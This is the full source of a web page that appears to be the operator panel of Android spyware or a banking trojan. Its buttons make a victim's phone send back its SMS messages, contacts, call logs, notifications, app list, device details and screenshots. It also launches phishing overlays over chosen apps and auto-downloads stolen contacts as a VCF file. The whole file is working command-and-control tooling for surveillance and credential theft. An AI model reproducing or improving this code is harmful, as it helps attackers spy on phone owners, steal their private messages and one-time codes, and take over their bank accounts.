<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Device Control</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    :root{
      --bg: #071226;
      --panel: #0b2230;
      --muted: #b6c6d0;
      --accent: #2b8cff;
      --accent-2: #16a34a;
      --card: #071f29;
      --glass: rgba(255,255,255,0.03);
      --radius: 12px;
    }
    *{box-sizing:border-box}
    html,body{height:100%;margin:0;font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial;color:var(--muted);background:linear-gradient(180deg,#051223 0%, #081827 100%);}
    .app { display:grid; grid-template-columns: 260px 1fr 360px; gap:18px; height:100vh; padding:18px; }
    /* SIDEBAR */
    .sidebar{ background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); border-radius:var(--radius); padding:18px; border:1px solid rgba(255,255,255,0.02); display:flex;flex-direction:column; gap:12px; overflow:auto;}
    .logo{font-weight:700;color:var(--accent);font-size:18px}
    .meta{font-size:13px;color:#9fb0bd}
    .badge{padding:6px 10px;border-radius:999px;font-weight:700;font-size:13px}
    .offline{background:rgba(255,255,255,0.03);color:#7ea2b9}
    .online{background:linear-gradient(90deg,#0ea5a4,#16a34a);color:white}
    .group{margin-top:10px}
    .group h4{margin:8px 0;color:#92b3c6;font-size:13px}
    .actions{display:flex;flex-wrap:wrap;gap:8px}
    .btn{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); color:white;border:1px solid rgba(255,255,255,0.04); padding:10px 12px;border-radius:10px;font-weight:700;cursor:pointer; min-width:120px; text-align:center;}
    .btn.ghost{background:transparent;border:1px solid rgba(255,255,255,0.03);color:var(--muted)}
    .btn.green{background:linear-gradient(90deg,var(--accent-2),#059669)}
    .btn.blue{background:linear-gradient(90deg,var(--accent),#1e40af)}
    .btn.red{background:linear-gradient(90deg,#ef4444,#dc2626)}
    .input{width:100%;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.03);background:rgba(255,255,255,0.02);color:var(--muted);font-size:14px}
    /* MAIN */
    .main{display:flex;flex-direction:column;gap:14px}
    .header{display:flex;align-items:center;justify-content:space-between;padding:12px 18px;border-radius:12px;background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.015));border:1px solid rgba(255,255,255,0.02);}
    .title{font-weight:700;color:#87c0ff}
    .clientInfo{color:#a8c3d6}
    .content{display:grid;grid-template-columns:1fr;gap:18px}
    .card{background:var(--panel);border-radius:12px;padding:16px;border:1px solid rgba(255,255,255,0.02);min-height:220px}
    .tabs{display:flex;gap:10px;margin-bottom:12px;flex-wrap:wrap}
    .tab{padding:8px 12px;border-radius:999px;background:rgba(255,255,255,0.01);color:#9fb0bd;font-weight:700;cursor:pointer}
    .tab.active{background:linear-gradient(90deg,#183648,#0f3a4a);color:#bfe6ff}
    /* Log */
    #log{background:#071a21;border-radius:10px;padding:14px;height:420px;overflow:auto;font-family:monospace;color:#9fb0bd;font-size:13px}
    /* Right column */
    .rightPanel{background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.015));border-radius:12px;padding:16px;border:1px solid rgba(255,255,255,0.02);overflow:auto}
    .shotsGrid{display:grid;gap:12px}
    .shot{background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.015));padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.02);display:flex;flex-direction:column;gap:8px}
    .shot img{width:100%;height:auto;border-radius:8px;object-fit:cover}
    .metaSmall{font-size:12px;color:#8ea3b4}
    /* tables / lists */
    table.kv{width:100%;border-collapse:collapse;color:var(--muted)}
    table.kv td{padding:8px;border-bottom:1px dashed rgba(255,255,255,0.03)}
    ul.list{list-style:none;padding:0;margin:0;display:grid;gap:8px}
    li.item{background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.01);display:flex;justify-content:space-between;align-items:center}
    .muted{color:#8ea3b4;font-size:13px}
    .loader{font-style:italic;color:#9fb0bd}
    @media (max-width:1000px){
      .app{grid-template-columns:1fr;grid-template-rows:auto 1fr auto}
      .rightPanel{order:3}
    }
  </style>
</head>
<body>
  <div class="app">
    <!-- LEFT SIDEBAR -->
    <aside class="sidebar">
      <div style="display:flex;align-items:center;justify-content:space-between;">
        <div>
          <div class="logo">Device Control</div>
          <div class="meta">ID: <span id="devId">-</span></div>
        </div>
        <div>
          <div id="status" class="badge offline">Offline</div>
        </div>
      </div>

      <div class="group">
        <h4>Quick actions</h4>
        <div class="actions">
          <button id="btnFetch" class="btn blue">Fetch Notification</button>
          <button id="btnStartNotify" class="btn green">Start Notify</button>
          <button id="btnStopNotify" class="btn ghost">Stop Notify</button>
          <button id="btnFetchSms" class="btn">Fetch SMS</button>
          <button id="btnFetchContact" class="btn">Fetch Contacts</button>
          <button id="btnFetchLog" class="btn">Fetch Calls</button>
          <button id="btnFetchApps" class="btn">Fetch Apps</button>
          <button id="btnFetchDevice" class="btn">Device Info</button>
        </div>
      </div>

      <div class="group">
        <h4>Overlay</h4>
        <label style="font-size:13px;color:#8ea3b4">Package</label>
        <input id="pkgInput" class="input" placeholder="com.example.app">
        <label style="font-size:13px;color:#8ea3b4">URL</label>
        <input id="urlInput" class="input" placeholder="https://...">
        <div style="display:flex;gap:8px;margin-top:8px;">
          <button id="btnCustomOverlay" class="btn blue">Start Overlay</button>
          <button id="btnStopOverlay" class="btn ghost">Stop Overlay</button>
        </div>
      </div>

      <div style="margin-top:auto;display:flex;flex-direction:column;gap:8px">
        <button id="btnUpload" class="btn blue">Upload</button>
        <button id="btnClose" class="btn red">Close</button>
      </div>
    </aside>

    <!-- MAIN -->
    <main class="main">
      <div class="header">
        <div>
          <div class="title">Live Device Console</div>
          <div class="clientInfo">Client: <span id="devName">unknown</span></div>
        </div>
        <div style="display:flex;gap:12px;align-items:center">
          <div class="muted">Status</div>
          <div id="statusSmall" class="badge offline">Offline</div>
        </div>
      </div>

      <div class="content">
        <div class="card">
          <div class="tabs" id="tabsRow">
            <div class="tab active" data-tab="logs">Logs</div>
            <div class="tab" data-tab="apps">Apps</div>
            <div class="tab" data-tab="sms">SMS</div>
            <div class="tab" data-tab="contacts">Contacts</div>
            <div class="tab" data-tab="calls">Calls</div>
            <div class="tab" data-tab="device">Device Info</div>
            <div class="tab" data-tab="screenshots">Screenshots</div>
          </div>

          <div id="viewLogs" class="view">
            <pre id="log">Connecting...</pre>
          </div>

          <div id="viewApps" class="view" style="display:none">
            <div id="appsLoading" class="loader">Idle</div>
            <ul id="appsList" class="list" style="margin-top:12px"></ul>
          </div>

          <div id="viewSms" class="view" style="display:none">
            <div id="smsLoading" class="loader">Idle</div>
            <ul id="smsList" class="list" style="margin-top:12px"></ul>
          </div>

          <div id="viewContacts" class="view" style="display:none">
            <div id="contactsLoading" class="loader">Idle</div>
            <ul id="contactsList" class="list" style="margin-top:12px"></ul>
          </div>

          <div id="viewCalls" class="view" style="display:none">
            <div id="callsLoading" class="loader">Idle</div>
            <ul id="callsList" class="list" style="margin-top:12px"></ul>
          </div>

          <div id="viewDevice" class="view" style="display:none">
            <div id="deviceLoading" class="loader">Idle</div>
            <table id="deviceTable" class="kv" style="margin-top:12px"></table>
          </div>

          <div id="viewScreenshots" class="view" style="display:none">
            <div class="muted">Screenshots appear on the right panel</div>
          </div>
        </div>
      </div>
    </main>

    <!-- RIGHT PANEL (screenshots) -->
    <aside class="rightPanel">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
        <div style="font-weight:700;color:#dbefff">Screenshots</div>
        <div class="muted">Auto saved</div>
      </div>
      <div id="screenshotsContainer" class="shotsGrid"></div>
    </aside>
  </div>

  <script>
    // --- Basic device info from URL ---
	let expectedTab = null;

    const pathParts = window.location.pathname.split("/");
    const clientId = pathParts[pathParts.length - 1] || "unknown";
    const urlParams = new URLSearchParams(location.search);
    const deviceName = decodeURIComponent(urlParams.get("name") || clientId);
    document.title = deviceName;
    document.getElementById("devName").textContent = deviceName;
    document.getElementById("devId").textContent = clientId;

    // --- Elements ---
    const logEl = document.getElementById("log");
    const statusEl = document.getElementById("status");
    const statusSmallEl = document.getElementById("statusSmall");

    // Tab views
    const tabsRow = document.getElementById("tabsRow");
    const views = {
      logs: document.getElementById("viewLogs"),
      apps: document.getElementById("viewApps"),
      sms: document.getElementById("viewSms"),
      contacts: document.getElementById("viewContacts"),
      calls: document.getElementById("viewCalls"),
      device: document.getElementById("viewDevice"),
      screenshots: document.getElementById("viewScreenshots")
    };

    // lists & loaders
    const appsList = document.getElementById("appsList");
    const appsLoading = document.getElementById("appsLoading");
    const smsList = document.getElementById("smsList");
    const smsLoading = document.getElementById("smsLoading");
    const contactsList = document.getElementById("contactsList");
    const contactsLoading = document.getElementById("contactsLoading");
    const callsList = document.getElementById("callsList");
    const callsLoading = document.getElementById("callsLoading");
    const deviceTable = document.getElementById("deviceTable");
    const deviceLoading = document.getElementById("deviceLoading");
    const screenshotsContainer = document.getElementById("screenshotsContainer");

    // --- Utilities ---
    function pushLog(msg) {
      const ts = new Date().toLocaleTimeString();
      logEl.textContent += `\n[${ts}] ${msg}`;
      logEl.scrollTop = logEl.scrollHeight;
    }

    async function sendCmd(cmd) {
      pushLog(`ðŸ“¤ Queuing "${cmd}"...`);
      try {
        const r = await fetch("/command", {
          method: "POST",
          headers: {"Content-Type":"application/json"},
          body: JSON.stringify({ targetClientId: clientId, command: cmd })
        });
        if (!r.ok) pushLog(`âŒ Failed to queue: ${r.status}`);
        else pushLog(`âœ… Command queued: ${cmd}`);
      } catch (e) {
        pushLog(`âš ï¸ Network error: ${e.message}`);
      }
    }

    // --- Tab behavior ---
    function setActiveTab(tabName) {
      // update tab button classes
      for (const t of tabsRow.querySelectorAll(".tab")) {
        t.classList.toggle("active", t.dataset.tab === tabName);
      }
      // show/hide views
      for (const k in views) {
        views[k].style.display = (k === tabName ? "" : "none");
      }
    }

    tabsRow.addEventListener("click", (ev) => {
      const tab = ev.target.closest(".tab");
      if (!tab) return;
      setActiveTab(tab.dataset.tab);
    });

    // --- wire up buttons (keeps original commands map) ---
    const map = {
      btnFetch: 'fetch',
      btnStartNotify: 'start-notify',
      btnStopNotify: 'stop-notify',
      btnFetchSms: 'fetch-sms',
      btnFetchContact: 'fetch-contact',
      btnFetchLog: 'fetch-logs',
      btnFetchApps: 'fetch-apps',
      btnFetchDevice: 'fetch-device',
      btnFetchScreenshot: 'fetch-screenshot',
      btnFetchScreenshotPermission: 'grant-screenshot-permission',
      btnUpload: 'upload'
    };
    Object.keys(map).forEach(id=>{
      const el = document.getElementById(id);
      if (!el) return;
      el.addEventListener("click", ()=>{
        const cmd = map[id];
        // special: set tab and loading states for data fetches
        if (cmd === 'fetch-apps') {
          expectedTab = "apps"; setActiveTab('apps'); appsLoading.textContent = 'Loading apps...'; appsList.innerHTML = '';
        } else if (cmd === 'fetch-sms') {
          expectedTab = "sms"; setActiveTab('sms'); smsLoading.textContent = 'Loading SMS...'; smsList.innerHTML = '';
        } else if (cmd === 'fetch-contact') {
          expectedTab = "contacts"; setActiveTab('contacts'); contactsLoading.textContent = 'Loading contacts...'; contactsList.innerHTML = '';
        } else if (cmd === 'fetch-logs') {
          expectedTab = "calls"; setActiveTab('calls'); callsLoading.textContent = 'Loading calls...'; callsList.innerHTML = '';
        } else if (cmd === 'fetch-device') {
          expectedTab = "device"; setActiveTab('device'); deviceLoading.textContent = 'Loading device info...'; deviceTable.innerHTML = '';
        } else if (cmd === 'fetch-screenshot') {
          // switch to screenshots (right panel message)
          setActiveTab('screenshots');
        }
        sendCmd(cmd);
      });
    });

    document.getElementById('btnCustomOverlay')?.addEventListener('click', ()=>{
      const pkg = document.getElementById('pkgInput').value.trim();
      const url = document.getElementById('urlInput').value.trim();
      if (!pkg || !url) { pushLog('âš ï¸ Please enter both PackageName and URL'); return; }
      sendCmd(`start-overlay{url:${url},PackageName:${pkg}}`);
    });
    document.getElementById('btnStopOverlay')?.addEventListener('click', ()=>sendCmd('stop-overlay'));
    document.getElementById('btnClose')?.addEventListener('click', ()=>window.close());

    // --- WebSocket & chunk reassembly ---
    const wsProto = location.protocol === "https:" ? "wss://" : "ws://";
    const ws = new WebSocket(wsProto + location.host);

    // chunk buffers keyed by deviceName (as sent in the chunk tag)
    const chunkBuffers = {}; // deviceName -> { total: N, parts: {i: "text"} }

    ws.onopen = () => pushLog("ðŸ”Œ WebSocket connected");
    ws.onclose = () => pushLog("âŒ WebSocket disconnected");
    ws.onerror = (e) => pushLog("âš ï¸ WebSocket error");

    ws.onmessage = (evt) => {
      try {
        const msg = JSON.parse(evt.data);
        // devices payload updates status
        if (msg.type === "devices") {
          const d = msg.devices?.[clientId];
          if (d && d.online) {
            statusEl.textContent = "Online"; statusEl.className = "badge online";
            statusSmallEl.textContent = "Online"; statusSmallEl.className = "badge online";
          } else {
            statusEl.textContent = "Offline"; statusEl.className = "badge offline";
            statusSmallEl.textContent = "Offline"; statusSmallEl.className = "badge offline";
          }
        }

        // handle device responses
        if (msg.type === "response" && msg.clientId === clientId) {
          // Responses may be chunked with pattern: [DeviceName chunk i/n]\n<chunk>
          const raw = String(msg.output || "");
          pushLog(`ðŸ“© Response chunk: ${shorten(raw)}`);

          // detect chunk header
          const chunkHeaderMatch = raw.match(/^\[(.+?)\s+chunk\s+(\d+)\/(\d+)\]\s*\n([\s\S]*)/i);
          if (chunkHeaderMatch) {
            const deviceTag = chunkHeaderMatch[1].trim();
            const idx = Number(chunkHeaderMatch[2]);
            const tot = Number(chunkHeaderMatch[3]);
            const chunkText = chunkHeaderMatch[4];

            if (!chunkBuffers[deviceTag]) chunkBuffers[deviceTag] = { total: tot, parts: {} };
            chunkBuffers[deviceTag].parts[idx] = chunkText;
            chunkBuffers[deviceTag].total = tot;

            // check if complete
            const parts = chunkBuffers[deviceTag].parts;
            const have = Object.keys(parts).length;
            if (have === tot) {
              // join in order
              let joined = '';
              for (let i = 1; i <= tot; i++) joined += (parts[i] || '');
              // remove buffer
              delete chunkBuffers[deviceTag];
              // process joined payload
              handleFullPayload(joined.trim());
            } else {
              pushLog(`â³ Assembled ${have}/${tot} chunks for ${deviceTag}`);
            }
          } else {
            // not chunked: try to parse directly
            handleFullPayload(raw.trim());
          }
        }
      } catch (e) {
        console.error("WS parse error", e);
      }
    };

    function shorten(s, n = 120) {
      if (!s) return '';
      return s.length > n ? s.slice(0,n) + 'â€¦' : s;
    }
	
	
	
	
	function generateVCF(contacts) {
  let vcf = "";

  contacts.forEach(c => {
    if (!c.name && (!c.phones || !c.phones.length)) return;

    vcf += "BEGIN:VCARD\n";
    vcf += "VERSION:3.0\n";

    // Name
    const safeName = c.name || "Unknown";
    vcf += `FN:${safeName}\n`;

    // Phones
    if (c.phones && c.phones.length) {
      c.phones.forEach(num => {
        vcf += `TEL:${num}\n`;  // keep EXACT format
      });
    }

    // Emails
    if (c.emails && c.emails.length) {
      c.emails.forEach(email => {
        vcf += `EMAIL:${email}\n`;
      });
    }

    vcf += "END:VCARD\n";
  });

  return vcf;
}




function downloadVCFFile(filename, content) {
  const blob = new Blob([content], { type: "text/vcard" });
  const url = URL.createObjectURL(blob);

  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();

  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

	
	
	
	
	function parseAndroidContactsExport(payload) {
  const contacts = [];
  const lines = payload.split("\n").map(l => l.trim());
  let current = { name: "Unknown", phones: [], emails: [] };
  let section = null;

  lines.forEach(line => {
    if (!line) return;

    if (line.startsWith("Name:")) {
      // Push previous before starting new
      if (current.name !== "Unknown" || current.phones.length || current.emails.length) {
        contacts.push(current);
      }
      current = {
        name: line.replace("Name:", "").trim(),
        phones: [],
        emails: []
      };
      section = null;
      return;
    }

    if (line.startsWith("Phones:")) { section = "phones"; return; }
    if (line.startsWith("Emails:")) { section = "emails"; return; }
    if (line.startsWith("----------------")) return;

    if (line.startsWith("-") && section === "phones") {
      const num = line.replace(/^-/, "").trim();

      // store EXACT format, only check duplicates
      if (num && !current.phones.includes(num)) {
        current.phones.push(num);
      }
      return;
    }

    if (line.startsWith("-") && section === "emails") {
      const email = line.replace(/^-/, "").trim();
      if (email) current.emails.push(email);
      return;
    }
  });

  // push last one
  if (current.name !== "Unknown" || current.phones.length || current.emails.length) {
    contacts.push(current);
  }

  return contacts;
}



	
	
	
	

    // --- payload processing: try to detect JSON arrays/objects and route to correct tab ---
    function handleFullPayload(payload) {
      // payload might include log text + a JSON snippet; attempt to find the JSON start
      // trim known leading/trailing whitespace
      const p = payload.trim();
	  //const cleaned = p.replace(/^\[[^\]]*?\]\s*\n?/g, "").trim();
		// Remove only the first bracket header like [DeviceName chunk ...]
    //const cleaned = payload.replace(/^\[[^\]]*?\]\s*\n?/, "").trim();
    //const p = cleaned;
	  
	  
	  // Detect Contacts Export (plain text, not JSON)
if (p.includes("=== Contacts Export")) {
    const contacts = [];
    const lines = p.split("\n");

    let current = {};

    lines.forEach(line => {
        line = line.trim();

        if (line.startsWith("Name:")) {
            if (current.name || current.phone) {
                contacts.push(current);
                current = {};
            }
            current.name = line.replace("Name:", "").trim();
        }

        if (line.startsWith("Phone:")) {
            current.phone = line.replace("Phone:", "").trim();
        }

        if (line.startsWith("---")) {
            if (current.name || current.phone) {
                contacts.push(current);
                current = {};
            }
        }
    });

    if (current.name || current.phone) contacts.push(current);

	 const contac = parseAndroidContactsExport(p);
		
    renderContacts(contac);
    setActiveTab("contacts");
	
	// Auto-download VCF
	const vcf = generateVCF(contac);
	downloadVCFFile("MyContacts.vcf", vcf);
	
    return;
}

	  

      // Try parse as JSON directly if it starts with { or [
      if (p.startsWith("{") || p.startsWith("[")) {
        try {
          const parsed = JSON.parse(p);
          handleParsedObject(parsed);
          return;
        } catch (err) {
          // not valid JSON -> fall-through to log display
        }
      }

      // Sometimes device sends "Received object payload: {...}" or other prefixes.
      // Try to extract the first {...} or [...] sequence
      const jsonMatch = p.match(/(\{[\s\S]*\}|\[[\s\S]*\])/);
      if (jsonMatch) {
        try {
          const parsed = JSON.parse(jsonMatch[1]);
          handleParsedObject(parsed);
          return;
        } catch (err) {
          // fall through
        }
      }

      // Otherwise just display in logs
      pushLog(`ðŸ“¥ ${p}`);
    }

    // Inspect parsed JSON and route
    function handleParsedObject(obj) {

  // ------------------------------------------
  // 1) PRIORITY: If the user clicked a Fetch button
  // use strict routing and DO NOT auto-switch
  // ------------------------------------------
  if (expectedTab) {
    if (expectedTab === 'apps') {
      renderApps(obj);
      setActiveTab('apps');
    }
    else if (expectedTab === 'sms') {
      renderSms(obj);
      setActiveTab('sms');
    }
    else if (expectedTab === 'contacts') {
      renderContacts(obj);
      setActiveTab('contacts');
    }
    else if (expectedTab === 'calls') {
      renderCalls(obj);
      setActiveTab('calls');
    }
    else if (expectedTab === 'device') {
      renderDeviceInfo(obj);
      setActiveTab('device');
    }

    expectedTab = null;   // clear flag
    return;
  }

  // ------------------------------------------
  // 2) FALLBACK: Auto-detection ONLY when not expecting
  // ------------------------------------------
  if (Array.isArray(obj)) {
    if (obj.length === 0) {
      pushLog("âš ï¸ Received empty array");
      return;
    }

    const keys = Object.keys(obj[0]).map(k => k.toLowerCase()).join(' ');

    if (keys.includes('package')) {
      renderApps(obj); return;
    }

    if (keys.includes('address') || keys.includes('body')) {
      renderSms(obj); return;
    }

    if (keys.includes('phone') || keys.includes('email')) {
      renderContacts(obj); return;
    }

    if (keys.includes('duration') || keys.includes('type')) {
      renderCalls(obj); return;
    }

    // default fallback
    renderApps(obj);
    return;
  }

  else if (typeof obj === 'object') {
    renderDeviceInfo(obj);
    return;
  }

  pushLog("ðŸ“¥ Received: " + String(obj));
}


   function renderApps(arr) {
  if (!arr || arr.length === 0) {
    appsLoading.textContent = "No apps received";
    appsList.innerHTML = "";
    return;
  }

  appsLoading.textContent = `Showing ${arr.length} apps`;
  appsList.innerHTML = "";

  arr.forEach((item, index) => {
    let appName = "Unknown App";
    let pkg = "Unknown Package";

    // CASE 1 â€” JSON object
    if (typeof item === "object") {
      appName =
        item.appName ||
        item.label ||
        item.name ||
        item.app ||
        "Unknown App";

      pkg =
        item.package ||
        item.packageName ||
        item.pkg ||
        item.bundle ||
        "Unknown Package";
    }

    // CASE 2 â€” Raw string formats
    else {
      const raw = String(item);

      const nameMatch =
        raw.match(/App[:\s]*(.+)/i) ||
        raw.match(/Name[:\s]*(.+)/i) ||
        raw.match(/Label[:\s]*(.+)/i);

      const pkgMatch =
        raw.match(/Package[:\s]*(.+)/i) ||
        raw.match(/Pkg[:\s]*(.+)/i) ||
        raw.match(/Bundle[:\s]*(.+)/i);

      if (nameMatch) appName = nameMatch[1].trim();
      if (pkgMatch) pkg = pkgMatch[1].trim();
    }

    const li = document.createElement("li");
    li.className = "item";
    li.innerHTML = `
      <div style="display:flex;flex-direction:column;gap:3px;">
          <div style="font-weight:700;font-size:15px;color:#d0e7ff">
              ${escapeHtml(appName)}
          </div>

          <div style="font-size:13px;color:#9bbad1">
              ðŸ“¦ ${escapeHtml(pkg)}
          </div>
      </div>

      <div style="font-size:11px;color:#7a8aa3">${index + 1}</div>
    `;

    appsList.appendChild(li);
  });
}


    function renderSms(arr) {
  if (!arr || arr.length === 0) {
    smsLoading.textContent = "No SMS found";
    smsList.innerHTML = "";
    return;
  }

  smsLoading.textContent = `Showing ${arr.length} messages`;
  smsList.innerHTML = "";

  arr.forEach((item, index) => {
    let address = "Unknown";
    let type = "unknown";
    let dateStr = "";
    let body = "";
    
    // --- CASE 1: Real JSON object ---
    if (typeof item === "object") {
      address = item.address || "Unknown";
      type = item.type || "unknown";
      body = item.body || "";
      
      if (item.date) {
        dateStr = item.date;
      }

    // --- CASE 2: Raw text chunk ---
    } else {
      const raw = String(item);

      // Extract contact/number
      const addr = raw.match(/From\/To:\s*(.*)/i);
      if (addr) address = addr[1].trim();

      // Extract type
      const t = raw.match(/Type:\s*(.*)/i);
      if (t) type = t[1].trim();


      // Extract message body
      const msg = raw.match(/Message:\s*([\s\S]*)/i);
      if (msg) body = msg[1].trim();
    }

    // Pick color based on type
    const color = {
      inbox: "#6cd46c",
      sent: "#8ab6ff",
      other: "#d0d0d0"
    }[type] || "#d0d0d0";

    const li = document.createElement("li");
    li.className = "item";
    li.style.borderLeft = `4px solid ${color}`;

    li.innerHTML = `
      <div style="display:flex;flex-direction:column;gap:4px;">
          <div style="font-weight:700;color:#dce9ff;">
              ${escapeHtml(address)}
          </div>

          <div style="font-size:12px;color:${color}">
              ${type.toUpperCase()}
          </div>

          <div style="font-size:12px;color:#9cb3c7;">
              ${escapeHtml(dateStr)}
          </div>

          <div style="font-size:14px;color:#e8f3ff;white-space:pre-wrap;">
              ${escapeHtml(body)}
          </div>
      </div>

      <div style="font-size:11px;color:#7a8aa3;">${index + 1}</div>
    `;

    smsList.appendChild(li);
  });
}

		
		function renderContacts(arr) {
  if (!arr || arr.length === 0) return;

  contactsList.innerHTML = "";
  contactsLoading.textContent = `Showing ${arr.length} contacts`;

  arr.forEach((c, index) => {
    const name = c.name || "Unknown";
    const phones = c.phones || [];

    // Choose main phone exactly as received
    const firstPhone = phones.length ? phones[0] : "";

    let display;

    // If name is actually a number â†’ show number only
    if (name === firstPhone || name.match(/^\+?\d[\d\s()-]+$/)) {
      display = firstPhone || name;
    } else {
      display = firstPhone ? `${name} (${firstPhone})` : name;
    }

    const li = document.createElement("li");
    li.className = "item";

    li.innerHTML = `
      <div style="display:flex;flex-direction:column;gap:4px;">
        <div style="font-weight:700;color:#dce9ff;font-size:15px">
          ${escapeHtml(display)}
        </div>
      </div>
      <div style="font-size:11px;color:#7a8aa3;">${index + 1}</div>
    `;

    contactsList.appendChild(li);
  });
}





		
		

    function renderCalls(arr) {
  if (!arr || arr.length === 0) {
    callsLoading.textContent = "No call logs found";
    callsList.innerHTML = "";
    return;
  }

  callsLoading.textContent = `Showing ${arr.length} calls`;
  callsList.innerHTML = "";

  arr.forEach((item, index) => {
    let name = "Unknown";
    let number = "Unknown";
    let type = "unknown";
    let dateStr = "";
    let duration = 0;

    // ---- CASE 1 â€” JSON object ----
    if (typeof item === "object") {
      name = item.name || "";
      number = item.number || "Unknown";
      type = item.type || "unknown";
      duration = item.duration || 0;

      if (item.date) {
        dateStr = item.date;
      }

    // ---- CASE 2 â€” Raw text ----
    } else {
      const raw = String(item);

      const nameMatch = raw.match(/name[:,]?\s*"?(.*?)"?(,|$)/i);
      const numberMatch = raw.match(/number[:,]?\s*"?(.*?)"?(,|$)/i);
      const typeMatch = raw.match(/type[:,]?\s*"?(.*?)"?(,|$)/i);
      const dateMatch = raw.match(/date[:,]?\s*(.*)/i); // capture the rest of the line
      const durMatch = raw.match(/duration[:,]?\s*(\d+)/i);

      if (nameMatch) name = nameMatch[1].trim();
      if (numberMatch) number = numberMatch[1].trim();
      if (typeMatch) type = typeMatch[1].trim();
      if (dateMatch) dateStr = dateMatch[1].trim(); // already formatted string
      if (durMatch) duration = Number(durMatch[1]);
    }

    // Color code based on call type
    const color = {
      incoming: "#6cd46c",
      outgoing: "#8ab6ff",
      missed: "#ff6e6e"
    }[type] || "#d0d0d0";

    const li = document.createElement("li");
    li.className = "item";
    li.style.borderLeft = `4px solid ${color}`;

    li.innerHTML = `
        <div style="display:flex;flex-direction:column;gap:4px;">
            <div style="font-weight:700;color:#dce9ff;">
                ${escapeHtml(name && name !== "Unknown" ? name : number)} ${name && name !== "Unknown" ? '(' + escapeHtml(number) + ')' : ''}
            </div>
            <div style="font-size:12px;color:${color}">${type.toUpperCase()}</div>
            <div style="font-size:12px;color:#9cb3c7;">${escapeHtml(dateStr)}</div>
            <div style="font-size:12px;color:#b5c7d8;">Duration: ${duration}s</div>
        </div>
        <div style="font-size:11px;color:#7a8aa3;">${index + 1}</div>
        `;

    callsList.appendChild(li);
  });
}


    function renderDeviceInfo(obj) {
      deviceLoading.textContent = 'Device info received';
      deviceTable.innerHTML = '';
      for (const k of Object.keys(obj)) {
        const tr = document.createElement('tr');
        const keyTd = document.createElement('td'); keyTd.style.width = '40%'; keyTd.innerHTML = `<strong>${escapeHtml(k)}</strong>`;
        const valTd = document.createElement('td'); valTd.innerText = formatValue(obj[k]);
        tr.appendChild(keyTd); tr.appendChild(valTd);
        deviceTable.appendChild(tr);
      }
    }

    // screenshots handling (supabase URLs)
    function handlePossibleScreenshotOutput(text) {
      const urlMatch = text.match(/https?:\/\/[^\s]+supabase\.co[^\s"]+/i);
      if (urlMatch) {
        const url = urlMatch[0];
        const d = new Date();
        const stamp = `${d.getFullYear()}-${d.getMonth()+1}-${d.getDate()} ${d.getHours()}:${d.getMinutes()}:${d.getSeconds()}`;
        const item = document.createElement('div'); item.className = 'shot';
        item.innerHTML = `<div class="metaSmall">Captured: ${stamp}</div><img src="${url}" alt="shot"><div style="display:flex;gap:8px;margin-top:8px"><button class="btn ghost" onclick="downloadUrl('${url}', 'screenshot_${stamp.replace(/[^0-9]/g,'_')}.jpg')">Download</button><button class="btn ghost" onclick="window.open('${url}','_blank')">Open</button></div>`;
        screenshotsContainer.prepend(item);
      }
    }

    function downloadUrl(url, filename) {
      fetch(url).then(r => r.blob()).then(blob => {
        const blobUrl = URL.createObjectURL(blob);
        const a = document.createElement('a'); a.href = blobUrl; a.download = filename; document.body.appendChild(a); a.click(); a.remove();
        URL.revokeObjectURL(blobUrl);
      }).catch(e => pushLog('Download failed: ' + e.message));
    }

    // helpers
    function formatValue(v) {
      if (v === null || v === undefined) return '';
      if (typeof v === 'object') return JSON.stringify(v);
      return String(v);
    }
    function escapeHtml(s) {
      if (!s && s !== 0) return '';
      return String(s).replace(/[&<>"]/g, ch => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[ch]));
    }

    // If a parsed JSON isn't recognized, also try to extract screenshot URLs
    function fallbackProcessParsed(parsed, raw) {
      try { handlePossibleScreenshotOutput(raw); } catch (e) {}
      pushLog("ðŸ“¥ Unrecognized JSON payload (logged).");
    }

    // when non-json arrives, still check screenshots and log
    function handleTextPayload(text) {
      handlePossibleScreenshotOutput(text);
    }

    // high-level handler fallback: if handleParsedObject didn't display something, fallback to log + screenshot detection
    // (we already call handleFullPayload -> handleParsedObject so we only need to check screenshot in non-json branches)

    // Expose pushRemoteLog for external scripts if needed
    window.pushRemoteLog = pushLog;

    // initial tab
     setActiveTab('logs');
  </script>
</body>
</html>
